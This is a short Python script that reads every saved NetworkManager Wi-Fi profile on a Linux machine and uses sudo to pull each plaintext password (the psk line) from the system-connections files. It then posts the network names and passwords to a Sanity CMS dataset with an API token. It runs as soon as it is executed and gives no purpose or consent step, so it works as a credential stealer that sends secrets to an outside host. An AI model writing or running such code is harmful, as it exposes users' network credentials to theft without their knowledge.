import subprocess
import os
import json
import requests
from dotenv import load_dotenv

# Load .env for Sanity credentials
load_dotenv()
SANITY_PROJECT_ID = os.getenv("SANITY_PROJECT_ID")
SANITY_DATASET = os.getenv("SANITY_DATASET")
SANITY_API_TOKEN = os.getenv("SANITY_API_TOKEN")

def get_wifi_profiles():
    result = subprocess.run(["nmcli", "-t", "-f", "NAME", "connection", "show"],
                            stdout=subprocess.PIPE, text=True)
    profiles = result.stdout.strip().split('\n')
    return profiles

def get_password(profile):
    try:
        result = subprocess.run(["sudo", "cat", f"/etc/NetworkManager/system-connections/{profile}"],
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        lines = result.stdout.strip().split('\n')
        for line in lines:
            if "psk=" in line:
                return line.split('=')[1]
    except Exception:
        return None

def collect_wifi_data():
    wifi_data = []
    for profile in get_wifi_profiles():
        password = get_password(profile)
        wifi_data.append({"name": profile, "password": password})
    return wifi_data

def send_to_sanity(data):
    url = f"https://{SANITY_PROJECT_ID}.api.sanity.io/v1/data/mutate/{SANITY_DATASET}"
    headers = {
        "Authorization": f"Bearer {SANITY_API_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "mutations": [{
            "create": {
                "_type": "wifiData",
                "data": data
            }
        }]
    }
    response = requests.post(url, headers=headers, json=payload)
    print("Response from Sanity:", response.text)

# Run it
wifi_data = collect_wifi_data()
send_to_sanity(wifi_data)
